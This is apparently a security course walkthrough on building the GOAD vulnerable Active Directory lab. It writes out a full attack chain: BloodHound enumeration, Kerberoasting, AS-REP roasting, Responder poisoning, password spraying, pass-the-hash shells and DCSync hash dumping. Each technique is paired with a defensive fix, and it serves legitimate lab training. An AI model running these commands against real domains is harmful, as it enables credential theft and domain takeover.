# Walkthrough 4 — Build Your Own Active Directory Lab (GOAD)

Hands-on for Module 8. Active Directory is where most real pentests happen, and the only legal way to practise it is a domain **you build and own**. This walkthrough sets up **GOAD (Game of Active Directory)** — a free, deliberately-vulnerable AD lab made for exactly this — then points you at the attack chain and the defenses.

> Everything here runs on **your own hardware**. A real company/school AD is never a practice target (Module 0 — AD intrusions are among the most serious legally).

## What you're building
GOAD creates a small Windows domain (a couple of Domain Controllers + member servers) pre-loaded with realistic misconfigurations — Kerberoastable accounts, bad ACLs, delegation issues, etc. You attack it from Kali, exactly like a real internal engagement, with zero legal risk because it's yours.

## Requirements (it's heavy)
- A machine with **~24–32 GB RAM** free and ~100 GB disk (AD VMs are big). A beefy laptop or a spare desktop.
- **VirtualBox** or **VMware**, plus **Vagrant** and **Ansible** (GOAD automates the build with these).
- If your machine can't handle the full GOAD, use **GOAD-Light** (fewer VMs) or the cloud option (Ludus / a rented server you own).

## Setup steps
1. Install VirtualBox (or VMware), Vagrant, and Ansible. On Kali/Linux:
   ```bash
   sudo apt install -y virtualbox vagrant ansible git
   ```
2. Clone GOAD:
   ```bash
   git clone https://github.com/Orange-Cyberdefense/GOAD.git
   cd GOAD
   ```
3. Follow the project's README to pick a provider (VirtualBox/VMware/Proxmox) and lab (`GOAD` or the lighter `GOAD-Light`):
   ```bash
   ./goad.sh -t install -l GOAD-Light -p virtualbox
   ```
   This downloads the Windows eval images and builds the domain automatically. It takes a while and a lot of disk.
4. When it finishes, you'll have a running domain and a Kali/attacker box on the same virtual network. The README lists the machine IPs and the starting low-priv credentials.

> Tip: snapshot the VMs once built, so you can reset to a clean state after each practice run.

## Now practise the Module 8 chain — with the actual commands

Everything below runs from **Kali, against your own GOAD lab**. Replace `DOMAIN`, `dc-ip`, usernames and passwords with the values from GOAD's output. Install the toolkit first:

```bash
sudo apt install -y bloodhound neo4j crackmapexec responder
pipx install impacket          # GetUserSPNs, secretsdump, psexec, etc.
pipx install bloodhound-ace     # or use bloodhound-python for collection
```

### 1. Enumerate with BloodHound (find the paths to Domain Admin)
```bash
# Collect the domain graph remotely with a low-priv account GOAD gave you
bloodhound-python -u 'low.user' -p 'Password123' -d DOMAIN.local -ns <dc-ip> -c All --zip

# Start BloodHound UI, import the .zip, then run the built-in query
#   "Shortest Paths to Domain Admins"
sudo neo4j start && bloodhound &
```
Read the graph. Each edge is a permission you can abuse; the shortest path is your plan.

### 2. Harvest credentials
```bash
# Kerberoasting — request service tickets, crack them offline
GetUserSPNs.py DOMAIN.local/low.user:Password123 -dc-ip <dc-ip> -request -outputfile kerb.hash
hashcat -m 13100 -a 0 kerb.hash /usr/share/wordlists/rockyou.txt      # crack (Walkthrough 5)

# AS-REP roasting — accounts with pre-auth disabled
GetNPUsers.py DOMAIN.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip>

# LLMNR/NBT-NS poisoning — capture hashes from the network
sudo responder -I eth0           # wait for a hash, then crack with hashcat -m 5600
```

### 3. Validate and spray creds across the domain
```bash
# Check which hosts a credential works on (and if it's local admin -> "Pwn3d!")
crackmapexec smb <subnet>/24 -u cracked.user -p 'CrackedPass'
crackmapexec smb <subnet>/24 -u cracked.user -p 'CrackedPass' --shares
```

### 4. Lateral movement (Pass-the-Hash / credentials)
```bash
# If you have an NTLM hash instead of a password, pass it
crackmapexec smb <target-ip> -u admin.user -H <ntlm-hash>
psexec.py DOMAIN.local/admin.user@<target-ip> -hashes :<ntlm-hash>   # shell on the target
```

### 5. Escalate to Domain Admin
Abuse the specific path BloodHound showed (e.g. `GenericAll` over a group, constrained delegation). The BloodHound node's **Help → Abuse Info** tab gives the exact commands for that edge — follow it on your lab.

### 6. Domain domination (understand, don't deploy for real)
```bash
# DCSync — impersonate a DC to pull ALL password hashes (needs replication rights)
secretsdump.py DOMAIN.local/da.user:Password@<dc-ip>
# This dumps the krbtgt hash -> enables a Golden Ticket (persistence). Understand it; don't rely on it.
```

GOAD's wiki and community write-ups walk each of these on this exact lab if you get stuck. Tools (all in Kali): **BloodHound, impacket, crackmapexec, Responder, Rubeus, Certipy**.

## The defender's half (do this for each technique)
After each attack, fix it in your lab and confirm it's closed:
- **Kerberoasting** → set long (25+ char) managed service-account passwords (gMSA).
- **AS-REP roasting** → require Kerberos pre-auth on all accounts.
- **LLMNR/NBT-NS poisoning** → disable LLMNR and NBT-NS via GPO.
- **Pass-the-Hash lateral movement** → deploy **LAPS** (unique local admin passwords), tier your admins.
- **Dangerous ACLs/delegation** → fix the specific rights BloodHound flagged; re-run BloodHound to confirm the path is gone.
- **DCSync** → restrict replication rights to DCs only; monitor for replication from other hosts.

This loop — attack your lab, then harden your lab — is exactly what AD security engineers do for real companies.

## Lighter alternatives if GOAD is too heavy
- **TryHackMe** AD rooms ("Attacktive Directory", "Post-Exploitation Basics") — guided, low-resource, legal.
- **HackTheBox** AD machines and the Pro Lab "Dante"/"Zephyr" (legal, in-scope).
- A **single Windows Server eval VM** — build a tiny one-DC domain by hand; even that teaches a lot.

## Key takeaways
- The only legal AD practice is a domain you own — GOAD makes that easy and realistic.
- Real AD compromise is a **chain of misconfigurations**, not one exploit.
- For every attack, learn the fix and verify it with BloodHound — that's the job.

Next: **Walkthrough 5 — Password Cracking.**
